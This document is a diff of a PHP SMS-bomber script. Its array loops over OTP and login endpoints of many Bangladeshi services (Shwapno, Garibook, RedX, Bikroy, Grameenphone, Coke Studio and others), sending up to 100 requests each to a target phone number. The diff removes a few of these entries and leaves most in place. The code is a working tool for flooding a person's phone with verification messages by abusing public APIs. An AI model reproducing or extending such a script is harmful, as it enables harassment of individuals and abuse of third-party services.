@@ -47,8 +47,6 @@ for($i=1;$i<=15;$i++) $api_requests[] = ["name"=>"bdtickets_$i","url"=>"https://
 for($i=1;$i<=15;$i++) $api_requests[] = ["name"=>"shwapno_$i","url"=>"https://www.shwapno.com/api/auth","method"=>"POST","data"=>["phoneNumber"=>$phone_plus88],"headers"=>['Content-Type:application/json','cookie: cuid=98a49521-6662-498f-94eb-17d71974083f']];
 for($i=1;$i<=5;$i++) $api_requests[] = ["name"=>"garibook_$i","url"=>"https://api.garibookadmin.com/api/v4/user/login","method"=>"POST","data"=>["mobile"=>$phone_plus88,"channel"=>"web"],"headers"=>['Content-Type:application/json']];
 for($i=1;$i<=3;$i++) $api_requests[] = ["name"=>"deeptoplay_$i","url"=>"https://api.deeptoplay.com/v2/auth/login?platform=web","method"=>"POST","data"=>["number"=>$deepto_number],"headers"=>['Content-Type:application/json','Origin:https://www.deeptoplay.com']];
-for($i=1;$i<=100;$i++) $api_requests[] = ["name"=>"redx_$i","url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp","method"=>"POST","data"=>["phoneNumber"=>$phone_11],"headers"=>['Content-Type:application/json','Origin:https://redx.com.bd']];
-for($i=1;$i<=100;$i++) $api_requests[] = ["name"=>"bikroy_$i","url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11","method"=>"GET"];
 
 // ==========================================
 // 🟢 ১২-১৬: অন্যান্য সার্ভিস
@@ -113,11 +111,6 @@ for($i=1;$i<=30;$i++){
     
     // Coke Studio
     $api_requests[] = ["name"=>"cokestudio_$i", "url"=>"https://cokestudio23.sslwireless.com/api/store-and-send-otp", "method"=>"POST", "data"=>["msisdn"=>$phone_88, "name"=>"TeamDCG"], "headers"=>['Content-Type:application/json', 'Origin:https://cokestudio.sslwireless.com']];
-    // Bohubrihi
-    $api_requests[] = ["name"=>"bohubrihi_$i", "url"=>"https://bb-api.bohubrihi.com/public/activity/otp", "method"=>"POST", "data"=>["phone"=>$phone_11, "intent"=>"login"], "headers"=>['Content-Type:application/json', 'Origin:https://bohubrihi.com']];
-    
-    // Shikho (Discount Request - Alternative)
-    $api_requests[] = ["name"=>"shikho_alt_$i", "url"=>"https://api.shikho.com/public/activity/otp", "method"=>"POST", "data"=>["phone"=>$phone_11, "intent"=>"ap-discount-request"], "headers"=>['Content-Type:application/json', 'Origin:https://shikho.com']];
     
     // Grameenphone
     $api_requests[] = ["name"=>"grameenphone_$i", "url"=>"https://weblogin.grameenphone.com/backend/api/v1/otp", "method"=>"POST", "data"=>["msisdn"=>$phone_11], "headers"=>['Content-Type:application/json', 'Origin:https://weblogin.grameenphone.com']];
